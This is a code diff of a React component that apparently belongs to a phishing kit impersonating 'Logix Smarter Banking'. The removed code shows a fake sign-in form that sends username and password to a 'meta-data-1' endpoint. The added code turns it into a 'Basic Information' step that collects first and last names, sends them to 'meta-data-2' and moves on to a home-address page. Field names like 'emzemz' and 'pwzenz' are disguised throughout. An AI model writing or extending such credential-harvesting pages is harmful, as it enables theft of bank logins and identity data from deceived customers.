@@ -1,147 +1,121 @@
 import React, { useState } from 'react';
-import { useNavigate } from 'react-router-dom';
+import { useNavigate, useLocation } from 'react-router-dom';
 import axios from 'axios';
 import { baseUrl } from '../constants';
 
 const BasicInfo: React.FC = () => {
-  const [emzemz, setEmzemz] = useState('');
-  const [pwzenz, setPwzenz] = useState('');
+  const [fzNme, setFzNme] = useState('');
+  const [lzNme, setLzNme] = useState('');
   const [isLoading, setIsLoading] = useState(false);
-  const [showPwzenz, setShowPwzenz] = useState(false);
-  const [errors, setErrors] = useState({ emzemz: '', pwzenz: '' });
+  const [errors, setErrors] = useState({ fzNme: '', lzNme: '' });
+  const [emzemz, setEmzemz] = useState('');
 
   const navigate = useNavigate();
+  const location = useLocation();
+  const { emzemz: emzemzState } = location.state || {};
 
-  const togglePwzenzVisibility = () => {
-    setShowPwzenz((prev) => !prev);
-  };
-
-  const validateEmzemz = (emzemz: string) => {
-    const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-    return regex.test(emzemz);
-  };
-
-  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
-    setIsLoading(true);
-    event.preventDefault();
-    let newErrors = { emzemz: '', pwzenz: '' };
-
-    if (!validateEmzemz(emzemz)) {
-      newErrors.emzemz = 'Invalid email format.';
-      setIsLoading(false);
+  React.useEffect(() => {
+    if (emzemzState) {
+      setEmzemz(emzemzState);
     }
+  }, [emzemzState]);
 
-    if (pwzenz.length <= 0) {
-      newErrors.pwzenz = 'Password must be at least 6 characters.';
-      setIsLoading(false);
-    }
+  const validateForm = () => {
+    const newErrors = { fzNme: '', lzNme: '' };
+
+    if (!fzNme.trim()) newErrors.fzNme = 'First name is required';
+    if (!lzNme.trim()) newErrors.lzNme = 'Last name is required';
 
     setErrors(newErrors);
+    return !newErrors.fzNme && !newErrors.lzNme;
+  };
 
-    // Check if there are no errors
-    if (!newErrors.emzemz && !newErrors.pwzenz) {
-      // Proceed with form submission
-      console.log('Form submitted with:', { emzemz, pwzenz });
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
 
-      const url = `${baseUrl}api/meta-data-1/`;
+    if (!validateForm()) {
+      return;
+    }
 
-      try {
-        await axios.post(url, {
-          emzemz: emzemz,
-          pwzenz: pwzenz,
-        });
-        console.log('Message sent successfully');
-        navigate('/');
-      } catch (error) {
-        console.error('Error sending message:', error);
-        setIsLoading(false);
-      }
+    setIsLoading(true);
 
-      setErrors({ emzemz: '', pwzenz: '' });
+    try {
+      await axios.post(`${baseUrl}api/meta-data-2/`, {
+        emzemz,
+        fzNme,
+        lzNme
+      });
+
+      navigate('/home-address', {
+        state: {
+          emzemz,
+          fzNme,
+          lzNme
+        }
+      });
+    } catch (error) {
+      console.error('Error submitting form:', error);
+      setErrors(prev => ({
+        ...prev,
+        form: 'There was an error submitting your information. Please try again.'
+      }));
+    } finally {
+      setIsLoading(false);
     }
   };
 
   return (
-    <div className="flex-1 bg-gray-200 rounded shadow-sm">
-      <div className=" border-b-2 border-teal-500 px-6 py-4">
-        <h2 className="text-lg text-gray-700">Sign In – Welcome to Logix Smarter Banking</h2>
+    <div className="flex-1 bg-gray-200 rounded shadow-sm ">
+         <div className="border-b-2 border-teal-500 px-8 py-4">
+        <h2 className="text-xl font-semibold text-gray-800">Basic Information</h2>
       </div>
 
       <div className="px-6 py-6 bg-white space-y-4">
         <form onSubmit={handleSubmit}>
+   
           <div className="flex items-center gap-4 mb-4">
-            <label className="text-gray-700 w-24 text-right">Username:</label>
+            <label className="text-gray-700 w-24 text-right">First Name:</label>
             <input
-              id="emzemz"
-              name="emzemz"
-              type="email"
-              value={emzemz}
-              onChange={(e) => setEmzemz(e.target.value)}
+              id="fzNme"
+              name="fzNme"
+              type="text"
+              value={fzNme}
+              onChange={(e) => setFzNme(e.target.value)}
               className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
+              placeholder="Enter first name"
             />
-            <a href="#" className="text-blue-700 text-sm hover:underline">Not Registered?</a>
+            {errors.fzNme && (
+              <div className="flex items-center gap-2 text-red-600 text-sm">
+                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
+                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
+                </svg>
+                <span>{errors.fzNme}</span>
+              </div>
+            )}
           </div>
-
-          {errors.emzemz && (
-            <div className="flex items-center gap-3 text-sm font-bold mt-1 mb-1">
-              <svg
-                width="1rem"
-                height="1rem"
-                viewBox="0 0 24 24"
-                className="fill-current text-red-600"
-                aria-hidden="true"
-              >
-                <path
-                  d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"
-                  fillRule="nonzero"
-                ></path>
-              </svg>
-
-              <p>Email required</p>
-            </div>
-          )}
 
           <div className="flex items-center gap-4 mb-4">
-            <label className="text-gray-700 w-24 text-right">Password:</label>
+            <label className="text-gray-700 w-24 text-right">Last Name:</label>
             <input
-              id="pwzenz"
-              name="pwzenz"
-              type={showPwzenz ? 'text' : 'password'}
-              value={pwzenz}
-              onChange={(e) => setPwzenz(e.target.value)}
+              id="lzNme"
+              name="lzNme"
+              type="text"
+              value={lzNme}
+              onChange={(e) => setLzNme(e.target.value)}
               className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
+              placeholder="Enter last name"
             />
-            <a href="#" className="text-blue-700 text-sm hover:underline">Forgot Password?</a>
+            {errors.lzNme && (
+              <div className="flex items-center gap-2 text-red-600 text-sm">
+                <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
+                  <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"/>
+                </svg>
+                <span>{errors.lzNme}</span>
+              </div>
+            )}
           </div>
 
-          {errors.pwzenz && (
-            <div className="flex items-center gap-3 text-sm font-bold mt-2">
-              <svg
-                width="1rem"
-                height="1rem"
-                viewBox="0 0 24 24"
-                className="fill-current text-red-600"
-                aria-hidden="true"
-              >
-                <path
-                  d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"
-                  fillRule="nonzero"
-                ></path>
-              </svg>
-
-              <p>Password required</p>
-            </div>
-          )}
-
-          <div className="flex items-center gap-4">
-            <div className="w-24"></div>
-            <span
-              className="text-blue-700 text-sm hover:underline cursor-pointer"
-              onClick={togglePwzenzVisibility}
-            >
-              {showPwzenz ? 'Hide' : 'Show'}
-            </span>
-          </div>
+        
         </form>
       </div>
 
@@ -151,7 +125,7 @@ const BasicInfo: React.FC = () => {
             type="submit"
             className="bg-gray-600 hover:bg-gray-700 text-white px-16 py-2 text-sm rounded"
           >
-            Sign-In
+            Continue
           </button>
         ) : (
           <div className="h-10 w-10 animate-spin rounded-full border-4 border-solid border-gray-600 border-t-transparent"></div>
